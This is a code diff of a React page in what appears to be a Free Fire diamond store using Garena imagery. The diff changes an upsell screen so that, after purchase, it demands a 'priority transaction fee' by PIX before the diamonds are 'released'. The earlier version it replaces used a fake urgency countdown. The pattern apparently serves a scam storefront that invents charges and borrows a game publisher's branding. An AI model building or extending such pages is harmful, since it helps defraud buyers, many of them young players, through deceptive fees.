@@ -7,54 +7,33 @@ import { Button } from '@/components/ui/button';
 import { Header } from '@/components/freefire/Header';
 import { Footer } from '@/components/freefire/Footer';
 import { cn } from '@/lib/utils';
-import { upsellOffers } from '@/lib/data';
+import { taxOffer } from '@/lib/data';
 import { useToast } from '@/hooks/use-toast';
+import { CheckCircle } from 'lucide-react';
 
-const UpsellPage = () => {
+const Upsell2Page = () => {
     const router = useRouter();
     const { toast } = useToast();
-    const [selectedOfferId, setSelectedOfferId] = useState<string | null>(upsellOffers[0]?.id || null);
-    const [timeLeft, setTimeLeft] = useState(300); // 5 minutos em segundos
-
-    useEffect(() => {
-        const timer = setInterval(() => {
-            setTimeLeft(prevTime => {
-                if (prevTime <= 1) {
-                    clearInterval(timer);
-                    router.push('/success');
-                    return 0;
-                }
-                return prevTime - 1;
-            });
-        }, 1000);
-
-        return () => clearInterval(timer);
-    }, [router]);
-
-    const formatTime = (seconds: number) => {
-        const minutes = Math.floor(seconds / 60);
-        const remainingSeconds = seconds % 60;
-        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
-    };
+    const [selectedOfferId, setSelectedOfferId] = useState<string | null>(taxOffer[0]?.id || null);
 
     const handlePurchase = () => {
         if (!selectedOfferId) {
             toast({
                 variant: 'destructive',
                 title: 'Erro',
-                description: 'Por favor, selecione uma oferta para continuar.',
+                description: 'Nenhuma taxa selecionada.',
             });
             return;
         }
 
-        const selectedProduct = upsellOffers.find(p => p.id === selectedOfferId);
+        const selectedProduct = taxOffer.find(p => p.id === selectedOfferId);
         if (!selectedProduct) return;
 
         try {
+            // Adiciona a taxa ao que já foi selecionado
             localStorage.setItem('selectedProduct', JSON.stringify(selectedProduct));
             localStorage.setItem('paymentMethodName', 'PIX');
-            // Redireciona para o segundo upsell
-            router.push('/upsell-2');
+            router.push('/checkout');
         } catch (e) {
             console.error("Failed to access localStorage", e);
             toast({
@@ -70,29 +49,25 @@ const UpsellPage = () => {
             <Header />
             <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                 <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full">
+                    <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
                     <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
-                        Espere! Oferta Especial!
+                        Liberação Imediata
                     </h1>
                     <p className="mt-3 text-base text-gray-600">
-                        Sua compra foi aprovada! Antes de prosseguir, aproveite esta oferta exclusiva por tempo limitado.
+                        Para garantir a entrega imediata e segura dos seus diamantes, é necessário o pagamento de uma pequena taxa de transação prioritária.
                     </p>
                     
-                    <div className="my-6">
-                        <p className="text-sm uppercase font-semibold text-gray-500">A oferta termina em:</p>
-                        <div className="text-5xl font-bold text-destructive animate-pulse mt-1">{formatTime(timeLeft)}</div>
-                    </div>
-
                     <div className="flex flex-col gap-4 my-8">
-                        {upsellOffers.map(offer => (
+                        {taxOffer.map(offer => (
                             <div
                                 key={offer.id}
                                 className={cn(
-                                    "p-4 rounded-lg border-2 cursor-pointer transition-all duration-200 text-left flex items-center gap-4",
-                                    selectedOfferId === offer.id ? 'border-destructive bg-destructive/5' : 'border-gray-200 bg-white hover:border-gray-300'
+                                    "p-4 rounded-lg border-2 cursor-default transition-all duration-200 text-left flex items-center gap-4",
+                                    selectedOfferId === offer.id ? 'border-destructive bg-destructive/5' : 'border-gray-200 bg-white'
                                 )}
                             >
                                 <div className="flex-shrink-0">
-                                    <Image src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante" width={40} height={40} data-ai-hint="diamond gem" />
+                                    <Image src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/ic-safety-919638c4.png" alt="Taxa" width={40} height={40} data-ai-hint="shield" />
                                 </div>
                                 <div>
                                     <h2 className="text-lg font-bold text-gray-800">{offer.name}</h2>
@@ -109,14 +84,14 @@ const UpsellPage = () => {
                             className="w-full text-lg py-6 font-bold"
                             variant="destructive"
                         >
-                            Sim, Eu Quero Esta Oferta!
+                            Pagar Taxa e Liberar Diamantes
                         </Button>
                         <Button
                             onClick={() => router.push('/success')}
                             variant="link"
                             className="text-gray-500 hover:text-gray-700"
                         >
-                            Não, obrigado. Leve-me para a confirmação.
+                            Não, obrigado.
                         </Button>
                     </div>
                 </div>
@@ -126,4 +101,4 @@ const UpsellPage = () => {
     );
 };
 
-export default UpsellPage;
+export default Upsell2Page;
